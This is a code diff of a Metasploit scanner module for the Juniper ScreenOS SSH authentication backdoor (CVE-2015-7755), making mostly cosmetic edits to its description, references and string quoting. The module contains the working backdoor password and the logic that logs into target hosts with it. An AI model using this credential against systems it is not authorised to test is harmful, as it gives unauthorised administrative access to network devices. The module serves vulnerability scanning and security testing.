@@ -3,9 +3,10 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'net/ssh'
+
 class MetasploitModule < Msf::Auxiliary
 
-  require 'net/ssh'
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
@@ -13,17 +14,17 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Juniper SSH Backdoor Scanner',
       'Description'    => %q{
-        This module scans for the Juniper SSH backdoor.  Also valid on telnet.
-        A username is required, and hte password is <<< %s(un='%s') = %u
+        This module scans for the Juniper SSH backdoor (also valid on Telnet).
+        Any username is required, and the password is <<< %s(un='%s') = %u.
       },
       'Author'         => [
-        'hdm',                                       # discovery
-        'h00die <mike@stcyrsecurity.com>'            # Module
+        'hdm',                               # Discovery
+        'h00die <mike[at]stcyrsecurity.com>' # Module
       ],
       'References'     => [
         ['CVE', '2015-7755'],
         ['URL', 'https://community.rapid7.com/community/infosec/blog/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor'],
-        ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713&cat=SIRT_1&actp=LIST']
+        ['URL', 'https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10713']
       ],
       'DisclosureDate' => 'Dec 20 2015',
       'License'        => MSF_LICENSE
@@ -43,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
     ssh_opts = {
       port:         rport,
       auth_methods: ['password', 'keyboard-interactive'],
-      password:     '<<< %s(un=\'%s\') = %u'
+      password:     %q{<<< %s(un='%s') = %u}
     }
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
@@ -62,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if ssh
-      print_good("#{ip}:#{rport} - Logged in with backdoor account admin:<<< %s(un=\'%s\') = %u")
+      print_good("#{ip}:#{rport} - Logged in with backdoor account admin:<<< %s(un='%s') = %u")
       report_vuln(
         :host => ip,
         :name => self.name,
